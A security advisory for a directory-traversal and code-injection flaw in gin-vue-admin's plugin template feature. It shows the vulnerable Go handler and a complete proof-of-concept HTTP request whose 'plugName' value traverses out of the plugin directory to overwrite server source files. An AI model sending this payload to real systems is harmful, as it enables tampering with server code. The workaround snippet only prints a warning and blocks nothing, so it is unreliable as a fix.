# gin-vue-admin background arbitrary code coverage vulnerability

**GHSA**: GHSA-gv3w-m57p-3wc4 | **CVE**: CVE-2024-31457 | **Severity**: high (CVSS 7.7)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/flipped-aurora/gin-vue-admin/server** (go): < 0.0.0-20240409100909-b1b7427c6ea6

## Description

### Impact
"gin-vue-admin<=v2.6.1 has a code injection vulnerability in the backend. In the Plugin System -> Plugin Template feature, an attacker can perform directory traversal by manipulating the 'plugName' parameter. They can create specific folders such as 'api', 'config', 'global', 'model', 'router', 'service', and 'main.go' function within the specified traversal directory. Moreover, the Go files within these folders can have arbitrary code inserted based on a specific PoC parameter."

Affected code: https://github.com/flipped-aurora/gin-vue-admin/blob/746af378990ebf3367f8bb3d4e9684936df152e7/server/api/v1/system/sys_auto_code.go:239. Let's take a look at the method 'AutoPlug' within the 'AutoCodeApi' struct.
```go
func (autoApi *AutoCodeApi) AutoPlug(c *gin.Context) {
	var a system.AutoPlugReq
	err := c.ShouldBindJSON(&a)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	a.Snake = strings.ToLower(a.PlugName)
	a.NeedModel = a.HasRequest || a.HasResponse
	err = autoCodeService.CreatePlug(a)
	if err != nil {
		global.GVA_LOG.Error("预览失败!", zap.Error(err))
		response.FailWithMessage("预览失败", c)
		return
	}
	response.Ok(c)
}
```
The main reason for the existence of this vulnerability is the controllability of the PlugName field within the struct.
```go
type AutoPlugReq struct {
	PlugName    string         `json:"plugName"` // 必然大写开头
	Snake       string         `json:"snake"`    // 后端自动转为 snake
	RouterGroup string         `json:"routerGroup"`
	HasGlobal   bool           `json:"hasGlobal"`
	HasRequest  bool           `json:"hasRequest"`
	HasResponse bool           `json:"hasResponse"`
	NeedModel   bool           `json:"needModel"`
	Global      []AutoPlugInfo `json:"global,omitempty"`
	Request     []AutoPlugInfo `json:"request,omitempty"`
	Response    []AutoPlugInfo `json:"response,omitempty"`
}
```
POC：
```
POST /api/autoCode/createPlug HTTP/1.1
Host: 192.168.31.18:8080
Content-Length: 326
Accept: application/json, text/plain, */*
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiNzJlZWQ4OTUtYzUwOC00MDFiLWIyYzQtMTk2MWMyOTlkOWNhIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTcxMjIxMTM4MywibmJmIjoxNzExNjA2NTgzfQ.uq61pJNi4kzUXb8lEkVa7NBCBvp_Ye59fee-TJV_rpE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
x-user-id: 1
Content-Type: application/json
Origin: http://192.168.31.18:8080
Referer: http://192.168.31.18:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: x-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiNzJlZWQ4OTUtYzUwOC00MDFiLWIyYzQtMTk2MWMyOTlkOWNhIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTcxMjIyMDA4NiwibmJmIjoxNzExNjE1Mjg2fQ.XVV97Ky17E9pUO_byVgK--FnAp9ye4Tpab2jnma6dBU
Connection: close

{"plugName":"../../../server/","routerGroup":"111"	,"hasGlobal":true,"hasRequest":false,"hasResponse":false,"global":[{"key":"1","type":"1","desc":"1"},{"key":"type","value":"faspohgoahgioahgioahgioashogia","desc":"1","type":"string"}],"request":[{"key":"","type":"","desc":""}],"response":[{"key":"","type":"","desc":""}]}
```
By performing directory traversal and creating directories such as api, config, global, model, router, and service within the gin-vue-admin/server directory, an attacker can tamper with the source code and the main.go file. They can potentially overwrite or tamper with the Go source code files located in the directory C:\代码审计\server to further compromise the system.
![image](https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/c2cad65a-6401-41c2-ba0d-6eb5e3760516)
![image](https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/681ca156-c125-4a9f-9443-825a34a89b2d)
![image](https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/6870ce90-8166-48c7-a02c-29c4429283d4)


### Patches
Please wait for the latest patch

### Workarounds
You can use the following filtering methods to rectify the directory traversal problem
if strings.Index(plugPath, "..") > -1 {
        fmt.Println("no bypass",plugPath)
    }
### References
https://github.com/flipped-aurora/gin-vue-admin

